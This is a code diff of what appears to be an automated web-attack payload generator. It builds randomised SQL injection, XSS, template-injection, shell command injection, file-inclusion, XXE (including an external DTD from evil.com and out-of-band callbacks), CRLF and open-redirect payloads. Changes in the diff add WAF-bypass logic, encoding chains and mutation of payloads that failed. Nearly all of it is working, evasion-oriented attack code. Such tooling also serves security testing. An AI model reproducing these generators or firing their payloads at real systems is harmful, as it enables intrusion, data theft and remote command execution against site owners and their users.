+        elif s == "procedure_analyse": return f"{q}{ws}PROCEDURE{ws}ANALYSE(){c}", s
+        return f"{q}{ws}OR{ws}1=1{c}", s
 
-        return f"{q}{ws}OR{ws}1=1{c}", strat
+    def _build_xss(self, tier):
+        strats = ["classic_tag","event_handler","svg_animate","math_xlink",
+                  "details_open","iframe_srcdoc","input_onfocus","body_onpageshow",
+                  "marquee_onstart","video_source","object_data","embed_src",
+                  "mutation_xss","dom_xss","polyglot","template_injection",
+                  "svg_script","math_mtext","noscript_exit","style_import",
+                  "svg_use","foreign_object","animate_values","svg_set"]
+        s = self.rng.choice(strats)
+        js = self._pick("xss_js"); ws = self._pick("whitespace")
 
-    def _build_xss(self, length_tier: str) -> Tuple[str, str]:
-        strategies = [
-            "classic_tag", "event_handler", "svg_animate", "math_xlink",
-            "details_open", "iframe_srcdoc", "input_onfocus", "body_onpageshow",
-            "marquee_onstart", "video_source", "object_data", "embed_src",
-            "mutation_xss", "dom_xss", "polyglot", "template_injection",
-            "svg_script", "math_mtext", "noscript_exit", "style_import",
-            "xml_external", "svg_use", "foreign_object", "animate_values"
-        ]
-        strat = self.rng.choice(strategies)
-        js = self._pick("xss_js")
-        ws = self._pick("whitespace")
-
-        if strat == "classic_tag":
-            tag = self._pick("xss_tag"); event = self._pick("xss_event")
-            return f"<{tag}{ws}{event}={js}>", strat
-        elif strat == "event_handler":
-            ctx = self._pick("xss_context_break"); event = self._pick("xss_event")
-            return f"{ctx}{event}={js}", strat
-        elif strat == "svg_animate":
-            return f"<svg><animate onbegin={js} attributeName=x dur=1s>", strat
-        elif strat == "math_xlink":
-            return f"<math><mtext><table><mglyph><style><!--</style><img title=--&gt;&lt;img src=x onerror={js}&gt;>", strat
-        elif strat == "details_open":
-            return f"<details open ontoggle={js}>", strat
-        elif strat == "iframe_srcdoc":
-            return f'<iframe srcdoc="{self._enc_html_entity(f"<script>{js}</script>")}">', strat
-        elif strat == "input_onfocus":
-            return f'<input onfocus={js} autofocus>', strat
-        elif strat == "body_onpageshow":
-            return f'<body onpageshow={js}>', strat
-        elif strat == "marquee_onstart":
-            return f'<marquee onstart={js}>', strat
-        elif strat == "video_source":
-            return f'<video><source onerror={js}>', strat
-        elif strat == "object_data":
-            return f'<object data="javascript:{js}">', strat
-        elif strat == "embed_src":
-            return f'<embed src="javascript:{js}">', strat
-        elif strat == "mutation_xss":
-            return f'<noscript><p title="</noscript><img src=x onerror={js}>">', strat
-        elif strat == "dom_xss":
-            return f'javascript:eval(document.write(decodeURIComponent(location.hash.slice(1))))', strat
-        elif strat == "polyglot":
+        if s == "classic_tag":
+            return f"<{self._pick('xss_tag')}{ws}{self._pick('xss_event')}={js}>", s
+        elif s == "event_handler":
+            return f"{self._pick('xss_context_break')}{self._pick('xss_event')}={js}", s
+        elif s == "svg_animate": return f"<svg><animate onbegin={js} attributeName=x dur=1s>", s
+        elif s == "math_xlink":
+            return f"<math><mtext><table><mglyph><style><!--</style><img title=--&gt;&lt;img src=x onerror={js}&gt;>", s
+        elif s == "details_open": return f"<details open ontoggle={js}>", s
+        elif s == "iframe_srcdoc":
+            return f'<iframe srcdoc="{self._enc_html_entity(f"<script>{js}</script>")}">', s
+        elif s == "input_onfocus": return f'<input onfocus={js} autofocus>', s
+        elif s == "body_onpageshow": return f'<body onpageshow={js}>', s
+        elif s == "marquee_onstart": return f'<marquee onstart={js}>', s
+        elif s == "video_source": return f'<video><source onerror={js}>', s
+        elif s == "object_data": return f'<object data="javascript:{js}">', s
+        elif s == "embed_src": return f'<embed src="javascript:{js}">', s
+        elif s == "mutation_xss":
+            return f'<noscript><p title="</noscript><img src=x onerror={js}>">', s
+        elif s == "dom_xss":
+            return f'javascript:eval(document.write(decodeURIComponent(location.hash.slice(1))))', s
+        elif s == "polyglot":
             return (f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk={js} )'
                     f'//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>'
-                    f'\\x3csVg/<sVg/oNloAd={js}/>\\x3e'), strat
-        elif strat == "template_injection":
-            return f'{{{{constructor.constructor("return this")()}}}}', strat
-        elif strat == "svg_script":
-            return f"<svg><script>{js}</script></svg>", strat
-        elif strat == "math_mtext":
-            return f'<math><mtext><img src=x onerror={js}></mtext></math>', strat
-        elif strat == "noscript_exit":
-            return f'</noscript><img src=x onerror={js}>', strat
-        elif strat == "style_import":
-            return f'<style>@import "javascript:{js}";</style>', strat
-        elif strat == "svg_use":
-            return f'<svg><use href="data:image/svg+xml,{self._enc_url(f"<svg xmlns=\'http://www.w3.org/2000/svg\' onload=\'{js}\'/>")}"/>', strat
-        elif strat == "foreign_object":
-            return f'<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>{js}</script></body></foreignObject></svg>', strat
-        elif strat == "animate_values":
-            return f'<svg><set attributeName="onmouseover" value="{js}"/>', strat
+                    f'\\x3csVg/<sVg/oNloAd={js}/>\\x3e'), s
+        elif s == "template_injection":
+            return f'{{{{constructor.constructor("return this")()}}}}', s
+        elif s == "svg_script": return f"<svg><script>{js}</script></svg>", s
+        elif s == "math_mtext": return f'<math><mtext><img src=x onerror={js}></mtext></math>', s
+        elif s == "noscript_exit": return f'</noscript><img src=x onerror={js}>', s
+        elif s == "style_import": return f'<style>@import "javascript:{js}";</style>', s
+        elif s == "svg_use":
+            return f'<svg><use href="data:image/svg+xml,{self._enc_url(f"<svg onload=\'{js}\'/>")}"/>', s
+        elif s == "foreign_object":
+            return f'<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>{js}</script></body></foreignObject></svg>', s
+        elif s == "animate_values":
+            return f'<svg><set attributeName="onmouseover" value="{js}"/>', s
+        elif s == "svg_set":
+            return f'<svg><animate attributeName="onload" from="0" to="{js}" dur="0.1s"/>', s
+        return f"<script>{js}</script>", s
 
-        return f"<script>{js}</script>", strat
+    def _build_ssti(self, tier):
+        strats = ["jinja2_basic","jinja2_class_chain","jinja2_config",
+                  "twig_basic","twig_filter","freemarker","velocity",
+                  "smarty","pebble","thymeleaf","mako","django_tpl",
+                  "angular_expression","vue_expression","handlebars",
+                  "pug_interpolation","nunjucks","ejs"]
+        s = self.rng.choice(strats)
+        if s == "jinja2_basic": return f"{{{{{self._pick('ssti_expr')}}}}}", s
+        elif s == "jinja2_class_chain": return "{{''.__class__.__mro__[1].__subclasses__()}}", s
+        elif s == "jinja2_config":
+            return self.rng.choice(["{{config}}","{{config.items()}}","{{self.__dict__}}",
+                "{{request.environ}}","{{lipsum.__globals__}}"]), s
+        elif s == "twig_basic": return "{{7*7}}", s
+        elif s == "twig_filter":
+            return "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", s
+        elif s == "freemarker":
+            return self.rng.choice(["${7*7}","<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}"]), s
+        elif s == "velocity": return "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt", s
+        elif s == "smarty": return self.rng.choice(["{php}echo `id`;{/php}","{system('id')}","{$smarty.version}"]), s
+        elif s == "pebble": return "{{7*7}}", s
+        elif s == "thymeleaf": return "${7*7}", s
+        elif s == "mako": return "${7*7}", s
+        elif s == "django_tpl": return self.rng.choice(["{% debug %}","{{settings.SECRET_KEY}}"]), s
+        elif s == "angular_expression": return "{{constructor.constructor('return this')()}}", s
+        elif s == "vue_expression": return "{{constructor.constructor('alert(1)')()}}", s
+        elif s == "handlebars": return "{{#with this}}{{/with}}", s
+        elif s == "pug_interpolation": return "#{7*7}", s
+        elif s == "nunjucks": return "{{range.constructor('return this')()}}", s
+        elif s == "ejs": return "<%= 7*7 %>", s
+        return "{{7*7}}", s
 
-    def _build_ssti(self, length_tier: str) -> Tuple[str, str]:
-        strategies = [
-            "jinja2_basic", "jinja2_class_chain", "jinja2_config",
-            "twig_basic", "twig_filter", "freemarker", "velocity",
-            "smarty", "pebble", "thymeleaf", "mako", "django_tpl",
-            "angular_expression", "vue_expression", "handlebars",
-            "pug_interpolation", "nunjucks", "ejs"
-        ]
-        strat = self.rng.choice(strategies)
-
-        if strat == "jinja2_basic":
-            return f"{{{{{self._pick('ssti_expr')}}}}}", strat
-        elif strat == "jinja2_class_chain":
-            return "{{''.__class__.__mro__[1].__subclasses__()}}", strat
-        elif strat == "jinja2_config":
-            return self.rng.choice([
-                "{{config}}", "{{config.items()}}", "{{self.__dict__}}",
-                "{{request.environ}}", "{{lipsum.__globals__}}",
-                "{{cycler.__init__.__globals__.os}}",
-            ]), strat
-        elif strat == "twig_basic":
-            return "{{7*7}}", strat
-        elif strat == "twig_filter":
-            return "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", strat
-        elif strat == "freemarker":
-            return self.rng.choice([
-                "${7*7}", "${7*'7'}",
-                "<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}",
-            ]), strat
-        elif strat == "velocity":
-            return "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt", strat
-        elif strat == "smarty":
-            return self.rng.choice(["{php}echo `id`;{/php}", "{system('id')}", "{$smarty.version}"]), strat
-        elif strat == "pebble":
-            return "{{7*7}}", strat
-        elif strat == "thymeleaf":
-            return "${7*7}", strat
-        elif strat == "mako":
-            return "${7*7}", strat
-        elif strat == "django_tpl":
-            return self.rng.choice(["{% debug %}", "{{settings.SECRET_KEY}}"]), strat
-        elif strat == "angular_expression":
-            return "{{constructor.constructor('return this')()}}", strat
-        elif strat == "vue_expression":
-            return "{{constructor.constructor('alert(1)')()}}", strat
-        elif strat == "handlebars":
-            return "{{#with this}}{{/with}}", strat
-        elif strat == "pug_interpolation":
-            return "#{7*7}", strat
-        elif strat == "nunjucks":
-            return "{{range.constructor('return this')()}}", strat
-        elif strat == "ejs":
-            return "<%= 7*7 %>", strat
-
-        return "{{7*7}}", strat
-
-    def _build_cmdi(self, length_tier: str) -> Tuple[str, str]:
-        strategies = [
-            "semicolon", "pipe", "backtick", "subshell", "newline",
-            "ifs_bypass", "variable_bypass", "glob_bypass", "env_chain",
-            "base64_exec", "printf_exec", "xargs_exec", "find_exec",
-            "while_read", "heredoc", "process_substitution"
-        ]
-        strat = self.rng.choice(strategies)
+    def _build_cmdi(self, tier):
+        strats = ["semicolon","pipe","backtick","subshell","newline",
+                  "ifs_bypass","variable_bypass","glob_bypass","env_chain",
+                  "base64_exec","printf_exec","xargs_exec","find_exec",
+                  "while_read","heredoc","process_substitution"]
+        s = self.rng.choice(strats)
         cmd = self._pick("cmd_exec"); arg = self._pick("cmd_arg")
+        if s == "semicolon": return f";{cmd} {arg}", s
+        elif s == "pipe": return f"|{cmd} {arg}", s
+        elif s == "backtick": return f"`{cmd} {arg}`", s
+        elif s == "subshell": return f"$({cmd} {arg})", s
+        elif s == "newline": return f"\\n{cmd} {arg}\\n", s
+        elif s == "ifs_bypass": return f";{cmd}$IFS{arg}", s
+        elif s == "variable_bypass": return f";a={cmd};$a {arg}", s
+        elif s == "glob_bypass": return f";/{cmd[0]}??/{cmd}", s
+        elif s == "env_chain": return f";{cmd} {arg} #", s
+        elif s == "base64_exec":
+            enc = base64.b64encode(f"{cmd} {arg}".encode()).decode()
+            return f";echo {enc}|base64 -d|sh", s
+        elif s == "printf_exec": return f";$(printf '{cmd}') {arg}", s
+        elif s == "xargs_exec": return f";echo {arg}|xargs {cmd}", s
+        elif s == "find_exec": return f";find / -name '*' -exec {cmd} \\; 2>/dev/null", s
+        elif s == "while_read": return f";echo {arg}|while read x;do {cmd} $x;done", s
+        elif s == "heredoc": return f";{cmd} <<'EOF'\\n{arg}\\nEOF", s
+        elif s == "process_substitution": return f";{cmd} <({arg})", s
+        return f";{cmd} {arg}", s
 
-        if strat == "semicolon": return f";{cmd} {arg}", strat
-        elif strat == "pipe": return f"|{cmd} {arg}", strat
-        elif strat == "backtick": return f"`{cmd} {arg}`", strat
-        elif strat == "subshell": return f"$({cmd} {arg})", strat
-        elif strat == "newline": return f"\n{cmd} {arg}\n", strat
-        elif strat == "ifs_bypass": return f";{cmd}$IFS{arg}", strat
-        elif strat == "variable_bypass": return f";a={cmd};$a {arg}", strat
-        elif strat == "glob_bypass": return f";/{cmd[0]}??/{cmd}", strat
-        elif strat == "env_chain": return f";{cmd} {arg} #", strat
-        elif strat == "base64_exec":
-            encoded = base64.b64encode(f"{cmd} {arg}".encode()).decode()
-            return f";echo {encoded}|base64 -d|sh", strat
-        elif strat == "printf_exec": return f";$(printf '{cmd}') {arg}", strat
-        elif strat == "xargs_exec": return f";echo {arg}|xargs {cmd}", strat
-        elif strat == "find_exec": return f";find / -name '*' -exec {cmd} \\; 2>/dev/null", strat
-        elif strat == "while_read": return f";echo {arg}|while read x;do {cmd} $x;done", strat
-        elif strat == "heredoc": return f";{cmd} <<'EOF'\n{arg}\nEOF", strat
-        elif strat == "process_substitution": return f";{cmd} <({arg})", strat
-
-        return f";{cmd} {arg}", strat
-
-    def _build_lfi(self, length_tier: str) -> Tuple[str, str]:
-        strategies = [
-            "basic_traversal", "null_byte", "double_encode", "php_filter",
-            "php_input", "php_data", "expect_wrapper", "zip_wrapper",
-            "phar_wrapper", "glob_wrapper", "proc_wrapper", "log_poison",
-            "session_include", "utf7_encode", "backslash_traverse", "mixed_encoding"
-        ]
-        strat = self.rng.choice(strategies)
+    def _build_lfi(self, tier):
+        strats = ["basic_traversal","null_byte","double_encode","php_filter",
+                  "php_input","php_data","expect_wrapper","zip_wrapper",
+                  "phar_wrapper","glob_wrapper","proc_wrapper","log_poison",
+                  "session_include","mixed_encoding","backslash_traverse","utf8_overlong"]
+        s = self.rng.choice(strats)
         trav = self._pick("path_traversal")
-        depth = {"short": 3, "long": 5, "super_long": 7, "ultra_long": 10}.get(length_tier, 5)
+        depth = {"short":3,"long":5,"super_long":7,"ultra_long":10}.get(tier,5)
+        if s == "basic_traversal": return trav*depth+"etc/passwd", s
+        elif s == "null_byte": return trav*depth+"etc/passwd%00", s
+        elif s == "double_encode": return self._enc_double_url(trav*depth+"etc/passwd"), s
+        elif s == "php_filter": return f"php://filter/convert.base64-encode/resource={trav*depth}etc/passwd", s
+        elif s == "php_input": return "php://input", s
+        elif s == "php_data": return "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", s
+        elif s == "expect_wrapper": return "expect://id", s
+        elif s == "zip_wrapper": return f"zip://{trav*depth}tmp/evil.zip%23shell", s
+        elif s == "phar_wrapper": return f"phar://{trav*depth}tmp/evil.phar/shell", s
+        elif s == "glob_wrapper": return f"glob://{trav*depth}etc/pass*", s
+        elif s == "proc_wrapper": return "/proc/self/environ", s
+        elif s == "log_poison": return f"{trav*depth}var/log/apache2/access.log", s
+        elif s == "session_include": return f"{trav*depth}tmp/sess_PHPSESSID", s
+        elif s == "mixed_encoding": return self._enc_mixed(trav*depth+"etc/passwd"), s
+        elif s == "backslash_traverse": return ("\\..")*depth+"\\windows\\system32\\drivers\\etc\\hosts", s
+        elif s == "utf8_overlong": return "%c0%ae%c0%ae/"*depth+"etc/passwd", s
+        return trav*depth+"etc/passwd", s
 
-        if strat == "basic_traversal": return trav * depth + "etc/passwd", strat
-        elif strat == "null_byte": return trav * depth + "etc/passwd%00", strat
-        elif strat == "double_encode": return self._enc_double_url(trav * depth + "etc/passwd"), strat
-        elif strat == "php_filter": return f"php://filter/convert.base64-encode/resource={trav*depth}etc/passwd", strat
-        elif strat == "php_input": return "php://input", strat
-        elif strat == "php_data": return "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", strat
-        elif strat == "expect_wrapper": return "expect://id", strat
-        elif strat == "zip_wrapper": return f"zip://{trav*depth}tmp/evil.zip%23shell", strat
-        elif strat == "phar_wrapper": return f"phar://{trav*depth}tmp/evil.phar/shell", strat
-        elif strat == "glob_wrapper": return f"glob://{trav*depth}etc/pass*", strat
-        elif strat == "proc_wrapper": return "/proc/self/environ", strat
-        elif strat == "log_poison": return f"{trav*depth}var/log/apache2/access.log", strat
-        elif strat == "session_include": return f"{trav*depth}tmp/sess_PHPSESSID", strat
-        elif strat == "backslash_traverse": return ("\\.." * depth) + "\\windows\\system32\\drivers\\etc\\hosts", strat
-        elif strat == "mixed_encoding": return self._enc_mixed(trav * depth + "etc/passwd"), strat
-
-        return trav * depth + "etc/passwd", strat
-
-    def _build_xxe(self, length_tier: str) -> Tuple[str, str]:
-        strategies = ["classic", "parameter_entity", "blind_oob", "error_based", "xinclude"]
-        strat = self.rng.choice(strategies)
-        entity = self.rng.choice(["xxe", "foo", "x", "evil"])
-
-        if strat == "classic":
-            return (f'<?xml version="1.0"?><!DOCTYPE {entity} ['
-                    f'<!ENTITY {entity} SYSTEM "file:///etc/passwd">]>'
-                    f'<root>&{entity};</root>'), strat
-        elif strat == "parameter_entity":
-            return (f'<?xml version="1.0"?><!DOCTYPE {entity} ['
-                    f'<!ENTITY % {entity} SYSTEM "file:///etc/passwd">'
-                    f'%{entity};]><root/>'), strat
-        elif strat == "blind_oob":
-            domain = f"{self.rng.randint(1000,9999)}.burp.me"
-            return (f'<?xml version="1.0"?><!DOCTYPE {entity} ['
-                    f'<!ENTITY % {entity} SYSTEM "http://{domain}/">'
-                    f'%{entity};]><root/>'), strat
-        elif strat == "error_based":
-            return (f'<?xml version="1.0"?><!DOCTYPE {entity} ['
-                    f'<!ENTITY % {entity} SYSTEM "file:///etc/passwd">'
+    def _build_xxe(self, tier):
+        strats = ["classic","parameter_entity","blind_oob","error_based","xinclude"]
+        s = self.rng.choice(strats)
+        e = self.rng.choice(["xxe","foo","x","evil"])
+        if s == "classic":
+            return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
+                    f'<!ENTITY {e} SYSTEM "file:///etc/passwd">]>'
+                    f'<root>&{e};</root>'), s
+        elif s == "parameter_entity":
+            return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
+                    f'<!ENTITY % {e} SYSTEM "file:///etc/passwd">%{e};]><root/>'), s
+        elif s == "blind_oob":
+            d = f"{self.rng.randint(1000,9999)}.burp.me"
+            return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
+                    f'<!ENTITY % {e} SYSTEM "http://{d}/">%{e};]><root/>'), s
+        elif s == "error_based":
+            return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
+                    f'<!ENTITY % {e} SYSTEM "file:///etc/passwd">'
                     f'<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>'
-                    f'<root>&{entity};</root>'), strat
-        elif strat == "xinclude":
-            return f'<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>', strat
+                    f'<root>&{e};</root>'), s
+        elif s == "xinclude":
+            return f'<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>', s
+        return f'<?xml version="1.0"?><!ENTITY {e} SYSTEM "file:///etc/passwd">', s
 
-        return f'<?xml version="1.0"?><!ENTITY {entity} SYSTEM "file:///etc/passwd">', strat
+    def _build_crlf(self, tier):
+        strats = ["basic","encoded","unicode","double_encode","mixed"]
+        s = self.rng.choice(strats)
+        h = self.rng.choice(["Set-Cookie: brut=1","X-Brut: injected","Location: http://evil.com"])
+        if s == "basic": return f"%0d%0a{h}%0d%0a", s
+        elif s == "encoded": return f"%0D%0A{self._enc_url(h)}%0D%0A", s
+        elif s == "unicode": return f"\\u2028{h}\\u2029", s
+        elif s == "double_encode": return self._enc_double_url(f"\\r\\n{h}\\r\\n"), s
+        elif s == "mixed": return f"\\\\r\\\\n{h}\\\\r\\\\n", s
+        return f"%0d%0a{h}", s
 
-    def _build_crlf(self, length_tier: str) -> Tuple[str, str]:
-        strategies = ["basic", "encoded", "unicode", "double_encode", "mixed"]
-        strat = self.rng.choice(strategies)
-        header = self.rng.choice(["Set-Cookie: brut=1", "X-Brut: injected", "Location: http://evil.com"])
+    def _build_redirect(self, tier):
+        strats = ["basic","at_sign","double_slash","backslash","data_uri","javascript","encoded","unicode_domain"]
+        s = self.rng.choice(strats)
+        d = self.rng.choice(["evil.com","brut.test","x.test","attacker.io"])
+        if s == "basic": return f"https://{d}", s
+        elif s == "at_sign": return f"https://legit.com@{d}", s
+        elif s == "double_slash": return f"//{d}", s
+        elif s == "backslash": return f"\\\\\\\\{d}", s
+        elif s == "data_uri": return f"data:text/html,<script>alert(1)</script>", s
+        elif s == "javascript": return f"javascript:alert(1)", s
+        elif s == "encoded": return self._enc_url(f"https://{d}"), s
+        elif s == "unicode_domain": return f"https://{d.replace('.','．')}", s
+        return f"https://{d}", s
 
-        if strat == "basic": return f"%0d%0a{header}%0d%0a", strat
-        elif strat == "encoded": return f"%0D%0A{self._enc_url(header)}%0D%0A", strat
-        elif strat == "unicode": return f"\u2028{header}\u2029", strat
-        elif strat == "double_encode": return self._enc_double_url(f"\r\n{header}\r\n"), strat
-        elif strat == "mixed": return f"\\r\\n{header}\\r\\n", strat
-
-        return f"%0d%0a{header}", strat
-
-    def _build_redirect(self, length_tier: str) -> Tuple[str, str]:
-        strategies = ["basic", "at_sign", "double_slash", "backslash",
-                      "unicode_domain", "data_uri", "javascript", "encoded"]
-        strat = self.rng.choice(strategies)
-        domain = self.rng.choice(["evil.com", "brut.test", "x.test", "attacker.io"])
-
-        if strat == "basic": return f"https://{domain}", strat
-        elif strat == "at_sign": return f"https://legit.com@{domain}", strat
-        elif strat == "double_slash": return f"//{domain}", strat
-        elif strat == "backslash": return f"\\\\{domain}", strat
-        elif strat == "data_uri": return f"data:text/html,<script>alert(1)</script>", strat
-        elif strat == "javascript": return f"javascript:alert(1)", strat
-        elif strat == "encoded": return self._enc_url(f"https://{domain}"), strat
-
-        return f"https://{domain}", strat
+    def _build_polyglot(self, tier):
+        polyglots = self.polyglot.generate_all_polyglots()
+        if polyglots:
+            p = random.choice(polyglots)
+            return p["payload"], p["strategy"]
+        return "'-alert(1)-' OR '1'='1", "fallback"
 
     def _apply_length_tier(self, payload: str, tier: str) -> str:
         if tier == "short": return payload
         elif tier == "long":
-            ws = self._pick("whitespace")
-            return f"{ws}{payload}/**/"
+            return f"{self._pick('whitespace')}{payload}/**/"
         elif tier == "super_long":
-            comment = "/*" + "a" * 50 + "*/"
-            padding = self._pick("whitespace") * 3
-            return f"{padding}{comment}{payload}{comment}{padding}"
-        else:  # ultra_long
-            comment = "/*" + "x" * 200 + "*/"
-            padding = self._pick("whitespace") * 5
-            layered = f"{padding}{comment}{padding}{payload}{padding}{comment}{padding}"
-            return self._enc_mixed(layered)
-
-    def _apply_mutations(self, payload: str, num_mutations: int = 0) -> str:
-        if num_mutations == 0:
-            num_mutations = random.randint(0, 3)
-        for _ in range(num_mutations):
-            technique = random.choice(self.mutation_techniques)
-            try:
-                payload = technique(payload)
-            except Exception:
-                continue
-        return payload
+            return f"/*{'a'*50}*/{self._pick('whitespace')*3}{payload}/*{'a'*50}*/"
+        else:
+            c = f"/*{'x'*200}*/"
+            p = self._pick("whitespace") * 5
+            return f"{p}{c}{p}{payload}{p}{c}{p}"
 
     def generate(self, count: int) -> List[Dict]:
-        """Generate `count` unique payload variants from scratch."""
         builders = {
             "sqli": self._build_sqli, "xss": self._build_xss,
             "ssti": self._build_ssti, "cmdi": self._build_cmdi,
             "lfi": self._build_lfi, "xxe": self._build_xxe,
             "crlf": self._build_crlf, "redirect": self._build_redirect,
+            "polyglot": self._build_polyglot,
         }
-        tiers = ["short", "long", "super_long", "ultra_long"]
+        tiers = ["short","long","super_long","ultra_long"]
         weights = self.learner.get_adaptive_weights()
         payloads = []
-        seen_hashes = set()
+        seen = set()
 
         for i in range(count):
             cat = self.rng.choices(self.CATEGORIES, weights=weights, k=1)[0]
             tier = self.rng.choice(tiers)
-            builder = builders[cat]
-            raw_payload, strategy = builder(tier)
-            raw_payload = self._apply_length_tier(raw_payload, tier)
+            raw, strategy = builders[cat](tier)
+            raw = self._apply_length_tier(raw, tier)
 
-            mut_count = {"short": 0, "long": 1, "super_long": 2, "ultra_long": 3}[tier]
-            raw_payload = self._apply_mutations(raw_payload, mut_count)
+            mut_count = {"short":0,"long":1,"super_long":2,"ultra_long":3}[tier]
+            raw = self._apply_mutations(raw, mut_count)
 
-            payload_hash = hashlib.md5(raw_payload.encode(errors='ignore')).hexdigest()
-            if payload_hash in seen_hashes:
-                raw_payload += self._pick("whitespace") + str(self.rng.randint(1, 9999))
-                payload_hash = hashlib.md5(raw_payload.encode(errors='ignore')).hexdigest()
-            seen_hashes.add(payload_hash)
+            # Grammar validation
+            is_valid, reason = self.grammar.validate(raw, cat)
+            if not is_valid:
+                # Try to fix or regenerate
+                raw = self._apply_mutations(builders[cat](tier)[0], mut_count)
 
+            # WAF bypass application
+            if self.learner.waf_detected:
+                raw, _ = self.waf_bypass.apply_waf_bypass(
+                    raw, cat, self.learner.waf_type)
+
+            # Adaptive encoding rotation
+            raw = self.encoder.apply_chain(raw)
+
+            h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
+            if h in seen:
+                raw += self._pick("whitespace") + str(self.rng.randint(1,9999))
+                h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
+            seen.add(h)
             self.payload_counter += 1
+
             payloads.append({
                 "id": f"BRUT-{self.payload_counter:06d}",
-                "payload": raw_payload, "category": cat,
-                "length_tier": tier, "encoding": "raw",
-                "strategy": strategy, "length": len(raw_payload),
-                "hash": payload_hash, "built_from_scratch": True,
+                "payload": raw, "category": cat,
+                "length_tier": tier, "encoding": self.encoder.get_current_chain()[-1] if self.encoder.get_current_chain() else "raw",
+                "strategy": strategy, "length": len(raw),
+                "hash": h, "built_from_scratch": True,
                 "mutations_applied": mut_count,
                 "timestamp": datetime.now().isoformat(),
             })
@@ -1928,30 +2685,36 @@ class MLPayloadGenerator:
         return payloads
 
     def generate_advanced_batch(self, failed_payloads: List[Dict]) -> List[Dict]:
-        """Generate more advanced variants from failed payloads."""
-        if not failed_payloads:
-            return []
+        if not failed_payloads: return []
         advanced = []
         builders = {
             "sqli": self._build_sqli, "xss": self._build_xss,
             "ssti": self._build_ssti, "cmdi": self._build_cmdi,
-            "lfi": self._build_lfi,
+            "lfi": self._build_lfi, "polyglot": self._build_polyglot,
         }
+
         for fp in failed_payloads[:15]:
             cat = fp.get("category", "xss")
             builder = builders.get(cat, self._build_xss)
             for _ in range(5):
                 raw, strategy = builder("ultra_long")
+                # Apply heavy mutations + WAF bypass
                 raw = self._apply_mutations(raw, 5)
-                raw = self._enc_mixed(raw)
-                payload_hash = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
+                raw, _ = self.waf_bypass.apply_waf_bypass(raw, cat, self.learner.waf_type)
+                raw = self.encoder.apply_chain(raw)
+                # Grammar validate
+                is_valid, _ = self.grammar.validate(raw, cat)
+                if not is_valid:
+                    raw = self._apply_mutations(builder("ultra_long")[0], 3)
+
+                h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
                 self.payload_counter += 1
                 advanced.append({
                     "id": f"BRUT-ADV-{self.payload_counter:06d}",
                     "payload": raw, "category": cat,
                     "length_tier": "ultra_long", "encoding": "mixed_advanced",
-                    "strategy": strategy, "length": len(raw),
-                    "hash": payload_hash, "built_from_scratch": True,
+                    "strategy": strategy, "length": len(raw), "hash": h,
+                    "built_from_scratch": True,
                     "evolution_from": fp.get("id", ""),
                     "timestamp": datetime.now().isoformat(),
                 })
@@ -1959,7 +2722,7 @@ class MLPayloadGenerator:
 
 
 # ============================================================
-# RESPONSE ANALYZER
+# RESPONSE ANALYZER (preserved from v4.0)
 # ============================================================
 @dataclass
 class InjectionResult:
@@ -1972,286 +2735,231 @@ class InjectionResult:
     status_code: int
     response_time_ms: float
     response_size: int
-    response_type: str  # "server_output", "raw_html", "blocked"
+    response_type: str
     evidence: str
     response_snippet: str
     success: bool
+    anomaly_score: float
+    injection_context: str
+    generation_id: str
     timestamp: str
 
-    def to_dict(self):
-        return asdict(self)
+    def to_dict(self): return asdict(self)
 
 
 class ResponseAnalyzer:
     SERVER_ERROR_PATTERNS = [
-        r"sql\s*syntax", r"mysql", r"oracle", r"postgresql", r"sqlite",
-        r"unclosed\s*quotation", r"syntax\s*error.*?(near|at)",
-        r"warning.*?mysql", r"pg_query", r"sqlstate",
-        r"odbc.*?driver", r"microsoft.*?odbc",
-        r"ora-\d+", r"mysql_fetch", r"mysql_num_rows",
-        r"sqlite3\.OperationalError", r"psql", r"jdbc",
-        r"System\.Data\.OleDb", r"System\.Data\.SqlClient",
-        r"fatal\s*error.*?php", r"parse\s*error",
-        r"warning.*?on\s+line\s+\d+", r"notice.*?undefined",
+        r"sql\s*syntax",r"mysql",r"oracle",r"postgresql",r"sqlite",
+        r"unclosed\s*quotation",r"syntax\s*error.*?(near|at)",
+        r"warning.*?mysql",r"pg_query",r"sqlstate",
+        r"odbc.*?driver",r"microsoft.*?odbc",
+        r"ora-\d+",r"mysql_fetch",r"mysql_num_rows",
+        r"sqlite3\.OperationalError",r"psql",r"jdbc",
+        r"System\.Data\.OleDb",r"System\.Data\.SqlClient",
+        r"fatal\s*error.*?php",r"parse\s*error",
+        r"warning.*?on\s+line\s+\d+",r"notice.*?undefined",
         r"call\s+to\s+undefined\s+function",
         r"uncaught\s+(exception|error)",
-        r"traceback.*?(most\s+recent|innermost)", r"django",
-        r"werkzeug", r"flask", r"python.*?error",
-        r"jinja2.*?exception", r"template.*?error",
-        r"java\.lang\.", r"at\s+[a-zA-Z]+\.[a-zA-Z]+$",
-        r"exception\s+in\s+thread", r"apache\s+tomcat",
-        r"javax\.servlet", r"org\.springframework",
-        r"asp\.net", r"\.net\s+framework", r"system\.web",
-        r"server\s+error\s+in\s+'[^']+'\s+application",
-        r"at\s+[a-zA-Z]+\s+$[^)]+$", r"node\.js",
